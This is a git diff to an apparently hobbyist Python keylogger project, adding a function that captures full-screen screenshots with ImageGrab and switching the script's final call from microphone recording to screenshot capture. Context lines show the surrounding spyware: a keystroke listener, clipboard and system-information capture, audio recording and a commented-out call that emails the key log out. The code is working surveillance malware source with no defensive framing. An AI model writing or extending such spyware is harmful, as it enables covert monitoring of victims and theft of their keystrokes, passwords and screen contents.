@@ -38,6 +38,7 @@ key_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboardinfo.txt"
 audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
 file_path = "/Users/rachittanwar/Documents/[02]/Coding/Cybersecurity/Python Keylogger/project"
 extend = "/"
 
@@ -107,6 +108,12 @@ def microphone():
 
     write(file_path + extend + audio_information, fs, myrecording)
 
+# get screenshots
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+
 
 def on_press(key):
     global keys, count
@@ -144,4 +151,5 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 # send_email(key_information, file_path + extend + key_information, toaddr)
 # computer_information()
 # copy_clipboard()
-microphone()
+# microphone()
+screenshot()
